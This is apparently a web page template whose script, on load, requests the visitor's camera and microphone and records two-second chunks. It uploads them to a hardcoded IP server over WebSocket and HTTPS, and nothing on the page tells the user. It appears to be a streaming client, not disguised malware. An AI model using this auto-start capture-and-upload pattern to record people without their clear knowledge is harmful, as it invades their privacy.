<html>

<head>
    <script src="{{URL::asset('js/ajax.js')}}"></script>
    <script src="{{URL::asset('js/bootstrap.min.js')}}"></script>
</head>

<body id="body">

<video id="video" muted="muted" width="100%" height="100%" playsinline></video>

</body>

</html>
<script>

    var server = "185.239.106.228:8080";
    var server2 = "185.239.106.228/";
    //var server = "192.168.100.5:8080";
    //var server2 = "192.168.100.5/streamServer/";

    var PACKET_TIME = 2000;
    var socket = null;
    var finish = false;
	var timer;
	var timer2;
	var queue = [];
	var x = 6;
    var lastSend = -1;

    (function () {

        $(document).ready(function () {
		$("#video").prop('muted', true);
            WebSocketTest();
        });

        function WebSocketTest() {

            if ("WebSocket" in window) {

                var serverUrl = 'wss://' + server + '/demo';

                if (window.MozWebSocket) {
                    socket = new MozWebSocket(serverUrl);
                } else if (window.WebSocket) {
                    socket = new WebSocket(serverUrl);
                }

                if(socket == null) {
                    alert("WebSocket NOT supported by your Browser!");
                    return;
                }

                socket.binaryType = 'blob';

		socket.onmessage = (msg) => {
			//console.log(msg);
            	};


                socket.onopen = (msg) => {

		    socket.send(0x2);
                    timer = setInterval(function() {
                        if (!finish)
                            socket.send(0x3);
                    }, 5000);

                    timer2 = setInterval(function() {

                        mediaRecorder.stop();
                        if(finish) {
                            $("#body").empty();
                            return;
                        }
                        setTimeout(function () {
                            mediaRecorder.start();
                        }, 50);

                    }, 2000);

			/*
			var tt = setInterval(function() {
				socket.send(0x6);
			}, 200);

			setTimeout(function() {
				clearTimer(tt);
			}, 700);
			*/
                    startLive();
                };

                socket.onclose = (msg) => {
                    alert("finished");
                    finish = true;
                    clearInterval(timer);
                    clearInterval(timer2);
                    //clearInterval(timer3);
                };
            }
            else {
                alert("WebSocket NOT supported by your Browser!");
            }
        }

        var mediaRecorder;

        var constraintObj = {
            audio: true,
            video: {
                facingMode: "user",
		width: { min: 240, ideal: 640, max: 1024 },
	    	height: { min: 160, ideal: 480, max: 576 }
            }
        };

        function startLive() {

            if(navigator.mediaDevices === undefined) {
                navigator.mediaDevices = {};
                navigator.mediaDevices.getUserMedia = function (constraints) {

		    navigator.getUserMedia = navigator.getUserMedia ||
                    	navigator.webkitGetUserMedia ||
                        navigator.mozGetUserMedia ||
                        navigator.msGetUserMedia;

                    if(!getUserMedia) {
                        return Promise.reject(new Error("getUserMedia is not implemented in your browser"));
                    }
                    return new Promise(function (resolve, reject) {
                        getUserMedia.call(navigator, constraints, resolve, reject);
                    })
                }
            }

            navigator.mediaDevices.getUserMedia(constraintObj).then(function (mediaStreamObj) {

                var video = document.getElementById("video");
                if ("srcObject" in video) {
                    video.srcObject = mediaStreamObj;
                }
                else {
			window.URL = window.URL || window.webkitURL;
                        video.src = window.URL.createObjectURL(mediaStreamObj);
                }

                try {
			var options = {
        			audioBitsPerSecond: 64000,
        			videoBitsPerSecond: 400000,
        			mimeType: "video/webm;codecs=opus,vp8"
      			};

                    mediaRecorder = new MediaRecorder(mediaStreamObj, options);
                } catch (e) {
                    console.error('Exception while creating MediaRecorder: ' + e);
                    return;
                }

                video.onloadedmetadata = function (ev) {
                    video.play();
                    mediaRecorder.start();
                };

                mediaRecorder.ondataavailable = function (ev) {
                    //console.log(ev.data);
                    //socket.send(ev.data);
                    //setTimeout(function() {
                    //	socket.send(0x5);
                    //}, 2000);
                    var chunks = [];
                    chunks.push(ev.data);
		    queue.push([x, chunks]);

			if(queue.length === 1) {
	                    sender(chunks, x);
			}
                };

            });
        }

        function sender(data, x1) {

            var blob = new Blob(data, { type: data[0].type });

            var fd = new FormData();
            fd.append('data', blob);

            $.ajax({
                type: 'post',
                url: 'https://' + server2 + 'index3.php?x=' + x,
                data: fd,
                processData: false,
                contentType: false,
                timeout: 5000,
                success: function (res) {
			socket.send(x);
			x++;
			for(i = 0; i < queue.length; i++) {
				if(queue[i][0] == x1) {
					queue.splice(i, 1);
					break;
				}
			}
			if(queue.length > 0) {
				//var delay = (x % 4 === 0) ? 8000 : 4000;
				var delay = 4000;
				setTimeout(function() {
					sender(queue[0][1], queue[0][0]);
				}, delay);
			}
                    //queue.push([x1, res]);
                },
		error: function(request, status, error) {
			for(i = 0; i < queue.length; i++) {
				if(queue[i][0] == x1) {
					queue.splice(i, 1);
                                        break;
					//sender(queue[i][1], queue[i][0]);
					//return;
				}
			}
			if(queue.length > 0) {
                                //var delay = (x % 4 === 0) ? 8000 : 4000;
                                var delay = 4000;
                                setTimeout(function() {
                                        sender(queue[0][1], queue[0][0]);
                                }, delay);
                        }

		}
            });
        }
    })();


</script>

